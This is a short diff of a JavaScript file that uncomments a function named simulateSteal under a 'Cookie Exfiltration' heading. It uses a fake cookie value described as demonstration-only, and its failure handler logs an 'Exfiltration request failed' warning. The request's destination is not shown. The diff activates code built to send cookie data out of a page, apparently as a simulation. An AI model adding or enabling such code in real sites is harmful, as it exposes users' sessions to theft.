@@ -10,7 +10,6 @@ document.addEventListener('DOMContentLoaded', function () {
 });
 
 
-/*
 // Cookie Exfiltration
 function simulateSteal() {
   // Fake "cookie" value for demonstration purposes only.
@@ -26,4 +25,3 @@ function simulateSteal() {
       console.warn('Exfiltration request failed (expected in some environments):', err);
     });
 }
-*/
